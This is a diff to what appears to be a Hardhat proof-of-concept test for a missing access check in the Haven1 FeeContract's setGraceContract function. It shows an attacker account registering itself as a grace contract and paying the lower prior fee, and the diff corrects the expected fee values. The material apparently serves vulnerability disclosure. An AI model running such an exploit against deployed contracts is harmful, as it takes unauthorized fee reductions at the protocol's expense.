@@ -32,13 +32,14 @@ describe("Haven1 FeeContract — Permissionless setGraceContract PoC", function 
   });
 
   it("EXPLOIT: Attacker self-registers as grace contract and pays reduced fee", async function () {
-    // Step 1: Trigger a fee update so grace period is active
-    await feeContract.connect(deployer).triggerFeeUpdate(ethers.parseEther("2"));
+    // Step 1: Trigger a fee increase so _feePrior (2 H1) < _fee (3 H1)
+    // Constructor sets _feePrior=1, _fee=2. After this: _feePrior=2, _fee=3. Grace period active.
+    await feeContract.connect(deployer).triggerFeeUpdate(ethers.parseEther("3"));
 
     // Step 2: Normal user's fee
     const normalFee = await feeContract.connect(normalUser).getFee();
     console.log(`  Normal user fee:   ${ethers.formatEther(normalFee)} H1`);
-    expect(normalFee).to.equal(ethers.parseEther("2"));
+    expect(normalFee).to.equal(ethers.parseEther("3")); // new fee = 3 H1
 
     // Step 3: Attacker calls setGraceContract(true) — NO permission check
     await expect(
@@ -53,10 +54,10 @@ describe("Haven1 FeeContract — Permissionless setGraceContract PoC", function 
     // Step 5: Attacker now pays reduced (prior) fee
     const attackerFee = await feeContract.connect(attacker).getFee();
     console.log(`  Attacker fee:      ${ethers.formatEther(attackerFee)} H1`);
-    expect(attackerFee).to.equal(ethers.parseEther("1")); // pays PRIOR (lower) fee
+    expect(attackerFee).to.equal(ethers.parseEther("2")); // pays PRIOR (lower) fee: 2 H1 vs 3 H1
     expect(attackerFee).to.be.lt(normalFee);
 
-    const reduction = (Number(normalFee - attackerFee) * 100n) / normalFee;
+    const reduction = ((normalFee - attackerFee) * 100n) / normalFee;
     console.log(`  Fee reduction:     ${reduction}%`);
     console.log(`  ✓ Attacker obtained ${reduction}% fee reduction with zero authorization`);
   });
